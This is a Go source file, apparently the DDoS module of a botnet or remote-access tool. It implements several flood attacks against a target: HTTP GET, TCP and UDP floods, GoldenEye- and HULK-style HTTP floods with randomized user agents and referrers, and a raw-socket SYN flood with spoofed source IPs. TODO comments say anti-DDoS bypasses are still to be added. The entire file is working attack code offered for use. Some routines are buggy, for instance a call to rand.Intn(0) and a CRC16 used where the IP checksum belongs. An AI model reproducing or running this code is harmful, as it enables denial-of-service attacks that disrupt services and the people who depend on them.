//TODO:
// - Add Anti-DDoS Bypass's

package core

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func DDOSTimer(timer int) {
	time.Sleep(time.Duration(timer) * time.Minute)
	DDoSEnabled = false
}

func getUseragent() string {
	platform := A[rand.Intn(len(A))]
	var os string
	if platform == "Macintosh" {
		os = B[rand.Intn(len(B)-1)]
	} else if platform == "Windows" {
		os = C[rand.Intn(len(C)-1)]
	} else if platform == "X11" {
		os = D[rand.Intn(len(D)-1)]
	}
	browser := E[rand.Intn(len(E)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = F[rand.Intn(len(F)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return Spiders[rand.Intn(len(Spiders))]
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func CRC16Checksum(bs []byte) (crc uint16) {
	l := len(bs)
	for i := 0; i < l; i++ {
		crc = ((crc << 8) & 0xff00) ^ crc16tab[((crc>>8)&0xff)^uint16(bs[i])]
	}
	return
}

func RawTCPHeader(p *TCPHeader) []byte {
	headerLen := tcpMinHeaderLen + len(p.Options)
	raw := make([]byte, headerLen)
	binary.BigEndian.PutUint16(raw[0:2], uint16(p.Src))
	binary.BigEndian.PutUint16(raw[2:4], uint16(p.Dst))
	binary.BigEndian.PutUint32(raw[4:8], uint32(p.Seq))
	binary.BigEndian.PutUint32(raw[8:12], uint32(p.Ack))
	raw[12] = uint8(headerLen/4<<4 | 0) //TODO:  Reserved
	raw[13] = uint8(p.Flag)
	binary.BigEndian.PutUint16(raw[14:16], uint16(p.Win))
	binary.BigEndian.PutUint16(raw[16:18], uint16(p.Sum))
	binary.BigEndian.PutUint16(raw[18:20], uint16(p.Urp))
	if len(p.Options) > 0 {
		copy(raw[tcpMinHeaderLen:], p.Options)
	}
	return raw
}

func RawIPv4Header(p *IPv4Header) []byte {
	headerLen := ipv4MinHeaderLen + len(p.Options)
	raw := make([]byte, headerLen)
	raw[0] = byte(ipVersion<<4 | (headerLen >> 2 & 0x0f))
	raw[1] = byte(p.TOS)
	binary.BigEndian.PutUint16(raw[2:4], uint16(p.TotalLen))
	binary.BigEndian.PutUint16(raw[4:6], uint16(p.ID))
	flagsAndFragOff := (p.FragOff & 0x1fff) | int(p.Flags<<13)
	binary.BigEndian.PutUint16(raw[6:8], uint16(flagsAndFragOff))
	raw[8] = byte(p.TTL)
	raw[9] = byte(p.Protocol)
	binary.BigEndian.PutUint16(raw[10:12], uint16(p.Checksum))

	if ip := p.Src.To4(); ip != nil {
		copy(raw[12:16], ip[:net.IPv4len])
	}
	if ip := p.Dst.To4(); ip != nil {
		copy(raw[16:20], ip[:net.IPv4len])
	}
	if len(p.Options) > 0 {
		copy(raw[ipv4MinHeaderLen:], p.Options)
	}
	return raw
}

func getIPv4Header(dstIP net.IP) []byte {
	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
	ipv4Hdr := &IPv4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0,
		Src:      srcIP,
		Dst:      dstIP,
	}
	ipv4HdrBytes := RawIPv4Header(ipv4Hdr)
	ipv4Hdr.Checksum = int(CRC16Checksum(ipv4HdrBytes))
	return RawIPv4Header(ipv4Hdr)
}

func getTCPHeader(dstPort int) []byte {
	tcpHdr := &TCPHeader{
		Src:  rand.Intn(1<<16-1)%16383 + 49152,
		Dst:  dstPort,
		Seq:  rand.Intn(1<<32 - 1),
		Ack:  0,
		Flag: 0x02, // SYN flag
		Win:  2048,
		Urp:  0,
	}
	tcpHdrBytes := RawTCPHeader(tcpHdr)
	tcpHdr.Sum = int(CRC16Checksum(tcpHdrBytes))
	return RawTCPHeader(tcpHdr)
}

func HTTPGetAttack(target string, interval int) {
	for DDoSEnabled {
		resp, _ := http.Get(target)
		if resp != nil {
			io.Copy(ioutil.Discard, resp.Body)
			resp.Body.Close()
		}
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func TCPAttack(target string, interval int) {
	conn, _ := net.Dial("tcp", target)
	for DDoSEnabled {
		_, _ = fmt.Fprintf(conn, RandomString(rand.Intn(0)+256))
		_ = conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func UDPAttack(target string, interval int) {
	conn, _ := net.Dial("udp", target)
	for DDoSEnabled {
		_, _ = fmt.Fprintf(conn, RandomString(rand.Intn(0)+256))
		_ = conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func ACEAttack(target string, interval int) {
	for DDoSEnabled {
		conn, _ := net.Dial("udp", target+":"+strconv.Itoa(rand.Intn(80)+9999))
		fmt.Fprintf(conn, RandomString(rand.Intn(256)+1600))
		conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func GoldenEyeAttack(target string, interval int) {
	var client = new(http.Client)
	for DDoSEnabled {
		q, _ := http.NewRequest("GET", target, nil)
		q.Header.Set("User-Agent", getUseragent())
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", `*,identity,gzip,deflate`)
		q.Header.Set("Accept-Charset", `ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15`)
		q.Header.Set("Referer", Referrers[rand.Intn(len(Referrers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)+20000))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Content-Type", `multipart/form-data, application/x-url-encoded`)
		q.Header.Set("Cookies", RandomString(rand.Intn(5)+25))
		r, _ := client.Do(q)
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func HulkAttack(url string, host string, interval int) {
	var paramJoiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}
	for DDoSEnabled {
		q, _ := http.NewRequest("GET", url+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		q.Header.Set("User-Agent", getUseragent())
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
		q.Header.Set("Referer", Referrers[rand.Intn(len(Referrers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(110)+120))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)
		r, _ := client.Do(q)
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func SYNFlood(host string, port, packets, threads int) error {
	if threads == 0 || packets == 0 {
		return fmt.Errorf("threads or packets cannot be zero")
	}
	dstIP := net.ParseIP(host).To4()
	if dstIP == nil {
		return fmt.Errorf("destination address cannot be empty")
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return err
	}
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, 0x3, 1)
	if err != nil {
		return err
	}
	file := os.NewFile(uintptr(fd), "socket")
	rawSocket, err := net.FileConn(file)
	if err != nil {
		return err
	}
	for t := 0; t < threads; t++ {
		go func() {
			var buff bytes.Buffer
			for i := 0; i < packets/threads; i++ {
				rawIPv4Hdr := getIPv4Header(dstIP)
				rawTCPHdr := getTCPHeader(port)

				buff.Write(rawIPv4Hdr)
				buff.Write(rawTCPHdr)
				log.Println(rawSocket.Write(buff.Bytes()))
			}
		}()
	}
	c := make(chan int, 1)
	<-c
	return nil
}

//Need to add Anti-DDoS ddosbypass's
